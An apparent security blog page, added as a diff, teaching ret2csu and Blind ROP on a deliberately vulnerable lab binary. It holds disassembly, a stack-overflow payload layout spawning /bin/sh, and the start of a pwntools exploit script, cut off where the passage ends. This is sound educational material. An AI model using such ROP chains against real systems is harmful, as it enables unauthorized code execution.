@@ -1,0 +1,968 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ganliber.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="关于_libc_csu_init的利用和blind rop的方法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Blind ROP">
+<meta property="og:url" content="https://ganliber.github.io/2022/06/16/pwn/brop/index.html">
+<meta property="og:site_name" content="Ganliber&#39;s Home">
+<meta property="og:description" content="关于_libc_csu_init的利用和blind rop的方法。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:/Github/pwn/pwn_study/images/ret2csu_segment_fault.png">
+<meta property="og:image" content="d:/Github/pwn/pwn_study/images/stack_reading.png">
+<meta property="og:image" content="d:/Github/pwn/pwn_study/images/brop_gadget.png">
+<meta property="og:image" content="d:/Github/pwn/pwn_study/images/brop_plt.png">
+<meta property="og:image" content="d:/Github/pwn/pwn_study/images/brop_buffer_len.png">
+<meta property="og:image" content="d:/Github/pwn/pwn_study/images/brop_stop_gadgets.png">
+<meta property="og:image" content="d:/Github/pwn/pwn_study/images/brop_puts@plt.png">
+<meta property="article:published_time" content="2022-06-16T08:44:54.792Z">
+<meta property="article:modified_time" content="2022-06-16T09:08:56.018Z">
+<meta property="article:author" content="Gan Gecen">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="stack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/Github/pwn/pwn_study/images/ret2csu_segment_fault.png">
+
+<link rel="canonical" href="https://ganliber.github.io/2022/06/16/pwn/brop/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Blind ROP | Ganliber's Home</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ganliber's Home</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">1</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">1</span></a>
+
+  </li>
+        <li class="menu-item menu-item-pwn">
+
+    <a href="/pwn/" rel="section"><i class="fas fa-flag-checkered fa-fw"></i>pwn</a>
+
+  </li>
+        <li class="menu-item menu-item-system">
+
+    <a href="/system/" rel="section"><i class="fas fa-laptop-code fa-fw"></i>system</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ganliber.github.io/2022/06/16/pwn/brop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Gan Gecen">
+      <meta itemprop="description" content="An information security practitioner, focusing on system, Linux and pwn">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ganliber's Home">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Blind ROP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-06-16 16:44:54 / Modified: 17:08:56" itemprop="dateCreated datePublished" datetime="2022-06-16T16:44:54+08:00">2022-06-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2022/06/16/pwn/brop/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/06/16/pwn/brop/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <div class="post-description">关于_libc_csu_init的利用和blind rop的方法。</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Blind-ROP"><a href="#Blind-ROP" class="headerlink" title="Blind ROP"></a>Blind ROP</h1><p>[TOC]</p>
+<h2 id="x86与x64回顾"><a href="#x86与x64回顾" class="headerlink" title="x86与x64回顾"></a>x86与x64回顾</h2><ul>
+<li><p>x86</p>
+<ul>
+<li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li>
+</ul>
+</li>
+<li><p>x64</p>
+<ul>
+<li><p>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdi -&gt; rsi -&gt; rdx -&gt; rcx -&gt; r8 -&gt; r9</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><blockquote>
+<p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 <code>__libc_csu_init </code>中的 <code>gadgets</code>。这个函数是用来对 <code>libc</code> 进行初始化操作的，而一般的程序都会调用 <code>libc</code> 函数，所以这个函数一定会存在</p>
+</blockquote>
+<h3 id="libc-csu-init"><a href="#libc-csu-init" class="headerlink" title="__libc_csu_init"></a>__libc_csu_init</h3><blockquote>
+<p>使用文件<code>level</code>，由于官方给出的level带有<strong>编译优化</strong>，即像这样：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610                 mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615                 mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A                 mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F                 mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624                 add     rsp, 38h</span><br><span class="line">.text:0000000000400628                 retn</span><br><span class="line">--------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>实际上我们所需要的是<code>__libc_csu_init</code>中的下面这一段</p>
+<blockquote>
+<p>重新编译得到了<code>level</code>，因此本篇分析<code>level</code></p>
+<p>编译指令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -g -fno-stack-protector  -o level level.c</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><code>__libc_csu_init</code>代码</p>
+<blockquote>
+<p>查看汇编代码指令（风格：intel）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -S -mi386:x86-64:intel level</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">004011c0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4011c0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4011c4:	41 57                	push   r15</span><br><span class="line">  4011c6:	4c 8d 3d 43 2c 00 00 	lea    r15,[rip+0x2c43]        # 403e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  4011cd:	41 56                	push   r14</span><br><span class="line">  4011cf:	49 89 d6             	mov    r14,rdx</span><br><span class="line">  4011d2:	41 55                	push   r13</span><br><span class="line">  4011d4:	49 89 f5             	mov    r13,rsi</span><br><span class="line">  4011d7:	41 54                	push   r12</span><br><span class="line">  4011d9:	41 89 fc             	mov    r12d,edi</span><br><span class="line">  4011dc:	55                   	push   rbp</span><br><span class="line">  4011dd:	48 8d 2d 34 2c 00 00 	lea    rbp,[rip+0x2c34]        # 403e18 &lt;__do_global_dtors_aux_fini_array_entry&gt;</span><br><span class="line">  4011e4:	53                   	push   rbx</span><br><span class="line">  4011e5:	4c 29 fd             	sub    rbp,r15</span><br><span class="line">  4011e8:	48 83 ec 08          	sub    rsp,0x8</span><br><span class="line">  4011ec:	e8 0f fe ff ff       	call   401000 &lt;_init&gt;</span><br><span class="line">  4011f1:	48 c1 fd 03          	sar    rbp,0x3</span><br><span class="line">  4011f5:	74 1f                	je     401216 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  4011f7:	31 db                	xor    ebx,ebx</span><br><span class="line">  4011f9:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">[2]</span><br><span class="line">  401200:	4c 89 f2             	mov    rdx,r14</span><br><span class="line">  401203:	4c 89 ee             	mov    rsi,r13</span><br><span class="line">  401206:	44 89 e7             	mov    edi,r12d</span><br><span class="line">  401209:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]</span><br><span class="line"> ------------------------------------------------------------- </span><br><span class="line"> [3]</span><br><span class="line"> * 40120d:	48 83 c3 01          	add    rbx,0x1</span><br><span class="line"> * 401211:	48 39 dd             	cmp    rbp,rbx</span><br><span class="line"> * 401214:	75 ea                	jne    401200 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">   401216:	48 83 c4 08          	add    rsp,0x8</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">[1]</span><br><span class="line">  40121a:	5b                   	pop    rbx</span><br><span class="line">  40121b:	5d                   	pop    rbp</span><br><span class="line">  40121c:	41 5c                	pop    r12</span><br><span class="line">  40121e:	41 5d                	pop    r13</span><br><span class="line">  401220:	41 5e                	pop    r14</span><br><span class="line">  401222:	41 5f                	pop    r15</span><br><span class="line">  401224:	c3                   	ret    </span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">  401225:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">  40122c:	00 00 00 00 </span><br></pre></td></tr></table></figure>
+
+<p>因此只需要借助</p>
+<ul>
+<li><p>[1]<code>pop-ret</code>结构</p>
+<blockquote>
+<p><code>rbx</code>等会<strong>间接</strong>影响到后续的控制</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">40121a:	5b                   	pop    rbx</span><br><span class="line">40121b:	5d                   	pop    rbp</span><br><span class="line">40121c:	41 5c                	pop    r12</span><br><span class="line">40121e:	41 5d                	pop    r13</span><br><span class="line">401220:	41 5e                	pop    r14</span><br><span class="line">401222:	41 5f                	pop    r15</span><br><span class="line">401224:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>[2] 控制参数<code>rdi -&gt;rsi -&gt;rdx -&gt;rcx -&gt;r8 -&gt;r9</code></p>
+<blockquote>
+<ol>
+<li><p>此处控制的是 </p>
+<ul>
+<li>param3 : rdx</li>
+<li>param2 : rsi</li>
+<li>param1( low-32-bit ) : edi  -&gt; rdi 高32位会清零</li>
+</ul>
+</li>
+<li><p>如果我们可以合理地控制 <code>r15</code> 与 <code>rbx</code>，那么我们就可以调用我们想要调用的函数</p>
+<ul>
+<li>rbx &#x3D; 0 , r15 为存储我们想要调用的函数的地址</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">401200:	4c 89 f2             	mov    rdx,r14</span><br><span class="line">401203:	4c 89 ee             	mov    rsi,r13</span><br><span class="line">401206:	44 89 e7             	mov    edi,r12d</span><br><span class="line">401209:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>[3] 控制函数不跳转</p>
+<blockquote>
+<p>我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 &#x3D; rbp，这样我们就不会执行</p>
+<p><code>jne    401200 &lt;__libc_csu_init+0x40&gt;</code></p>
+<p>进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 40120d:	48 83 c3 01          	add    rbx,0x1</span><br><span class="line">* 401211:	48 39 dd             	cmp    rbp,rbx</span><br><span class="line">* 401214:	75 ea                	jne    401200 &lt;__libc_csu_init+0x40&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="分析level"><a href="#分析level" class="headerlink" title="分析level"></a>分析<code>level</code></h3><blockquote>
+<p>查看漏洞函数</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>查看<code>__libc_csu_init</code></p>
+<p>虽然开启了<code>RELRO</code>，但是<code>file</code>查看时并没有去除符号，因此是可见的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file level</span><br><span class="line">level: ELF <span class="number">64</span>-bit LSB executable, x86-<span class="number">64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span>, BuildID[sha1]=a28f7d9fc82c9c62d5e572365f45d29b78239d50, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">with</span> debug_info, <span class="keyword">not</span> stripped &lt;------ !!! ----</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>查看反汇编内容（得到内存地址）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">disassemble __libc_csu_init</span><br><span class="line">Dump of assembler code for function __libc_csu_init:</span><br><span class="line">   0x00000000004011c0 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x00000000004011c4 &lt;+4&gt;:	push   r15</span><br><span class="line">   0x00000000004011c6 &lt;+6&gt;:	lea    r15,[rip+0x2c43]        # 0x403e10</span><br><span class="line">   0x00000000004011cd &lt;+13&gt;:	push   r14</span><br><span class="line">   0x00000000004011cf &lt;+15&gt;:	mov    r14,rdx</span><br><span class="line">   0x00000000004011d2 &lt;+18&gt;:	push   r13</span><br><span class="line">   0x00000000004011d4 &lt;+20&gt;:	mov    r13,rsi</span><br><span class="line">   0x00000000004011d7 &lt;+23&gt;:	push   r12</span><br><span class="line">   0x00000000004011d9 &lt;+25&gt;:	mov    r12d,edi</span><br><span class="line">   0x00000000004011dc &lt;+28&gt;:	push   rbp</span><br><span class="line">   0x00000000004011dd &lt;+29&gt;:	lea    rbp,[rip+0x2c34]        # 0x403e18</span><br><span class="line">   0x00000000004011e4 &lt;+36&gt;:	push   rbx</span><br><span class="line">   0x00000000004011e5 &lt;+37&gt;:	sub    rbp,r15</span><br><span class="line">   0x00000000004011e8 &lt;+40&gt;:	sub    rsp,0x8</span><br><span class="line">   0x00000000004011ec &lt;+44&gt;:	call   0x401000 &lt;_init&gt;</span><br><span class="line">   0x00000000004011f1 &lt;+49&gt;:	sar    rbp,0x3</span><br><span class="line">   0x00000000004011f5 &lt;+53&gt;:	je     0x401216 &lt;__libc_csu_init+86&gt;</span><br><span class="line">   0x00000000004011f7 &lt;+55&gt;:	xor    ebx,ebx</span><br><span class="line">   0x00000000004011f9 &lt;+57&gt;:	nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x0000000000401200 &lt;+64&gt;:	mov    rdx,r14</span><br><span class="line">   0x0000000000401203 &lt;+67&gt;:	mov    rsi,r13</span><br><span class="line">   0x0000000000401206 &lt;+70&gt;:	mov    edi,r12d</span><br><span class="line">   0x0000000000401209 &lt;+73&gt;:	call   QWORD PTR [r15+rbx*8]</span><br><span class="line">   0x000000000040120d &lt;+77&gt;:	add    rbx,0x1</span><br><span class="line">   0x0000000000401211 &lt;+81&gt;:	cmp    rbp,rbx</span><br><span class="line">   0x0000000000401214 &lt;+84&gt;:	jne    0x401200 &lt;__libc_csu_init+64&gt;</span><br><span class="line">   0x0000000000401216 &lt;+86&gt;:	add    rsp,0x8</span><br><span class="line">   0x000000000040121a &lt;+90&gt;:	pop    rbx</span><br><span class="line">   0x000000000040121b &lt;+91&gt;:	pop    rbp</span><br><span class="line">   0x000000000040121c &lt;+92&gt;:	pop    r12</span><br><span class="line">   0x000000000040121e &lt;+94&gt;:	pop    r13</span><br><span class="line">   0x0000000000401220 &lt;+96&gt;:	pop    r14</span><br><span class="line">   0x0000000000401222 &lt;+98&gt;:	pop    r15</span><br><span class="line">   0x0000000000401224 &lt;+100&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Payload</span><br><span class="line">	&gt;Low Address</span><br><span class="line">     +-------------+</span><br><span class="line">     | cyclic      | &lt;--- hexToDecimal(<span class="number">0x80</span>-<span class="number">0x00</span>) + <span class="number">8</span> = <span class="number">136</span> <span class="built_in">bytes</span></span><br><span class="line">     | ret         | &lt;--- 关键(<span class="number">64</span>位下的 <span class="number">16</span>-<span class="built_in">bytes</span> 栈对齐)</span><br><span class="line">     | pop_rdi_ret |</span><br><span class="line">     | addr_bin_sh |</span><br><span class="line">     | addr_system |</span><br><span class="line">     +-------------+</span><br><span class="line">	&gt;High Address</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>破解前需要先关闭<code>ASLR</code></p>
+</li>
+<li><p>gdb调试过程中到最后<code>segmental fault</code>，程序停留在了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7e13e3c</span> &lt;do_system+<span class="number">364</span>&gt;    movaps xmmword ptr [rsp + <span class="number">0x50</span>], xmm0</span><br></pre></td></tr></table></figure>
+
+<p>经查看<code>rsp</code>的值为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsp   <span class="number">0x7fffffffd838</span></span><br></pre></td></tr></table></figure>
+
+<p>没有<code>16-bytes</code>对齐，因此<code>rsp+0x50</code>没有对齐，然而<code>movaps</code>需要<code>16-bytes</code>对齐，因此执行失败，需要查找ret指令的位置填充栈空间</p>
+</li>
+</ul>
+<h4 id="报错dbg图"><a href="#报错dbg图" class="headerlink" title="报错dbg图"></a>报错<code>dbg</code>图</h4><img src="D:\Github\pwn\pwn_study\images\ret2csu_segment_fault.png" alt="ret2csu_segment_fault" style="zoom:38%;" />
+
+<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; VA from __libc_csu_init &quot;&quot;&quot;</span></span><br><span class="line">pop_rbx = <span class="number">0x40121b</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401223</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; offset from database &quot;&quot;&quot;</span></span><br><span class="line">offset___libc_start_main_ret = <span class="number">0x24083</span></span><br><span class="line">offset_system = <span class="number">0x0000000000052290</span></span><br><span class="line">offset_dup2 = <span class="number">0x000000000010e8c0</span></span><br><span class="line">offset_read = <span class="number">0x000000000010dfc0</span></span><br><span class="line">offset_write = <span class="number">0x000000000010e060</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x1b45bd</span></span><br><span class="line">offset___libc_start_main = <span class="number">0x0000000000023f90</span></span><br><span class="line">offset_puts = <span class="number">0x0000000000084420</span></span><br><span class="line">offset_exit = <span class="number">0x0000000000046a40</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; addr of functions in libc &quot;&quot;&quot;</span></span><br><span class="line">addr_write = <span class="number">0x7ffff7ed0060</span></span><br><span class="line"></span><br><span class="line">libcBase = addr_write - offset_write</span><br><span class="line"></span><br><span class="line">addr_system = libcBase + offset_system  <span class="comment"># shell function addr</span></span><br><span class="line"></span><br><span class="line">addr_str_bin_sh = libcBase + offset_str_bin_sh  <span class="comment"># parameter</span></span><br><span class="line"></span><br><span class="line">addr_exit = libcBase + offset_exit  <span class="comment"># exit function</span></span><br><span class="line"></span><br><span class="line">io = process(<span 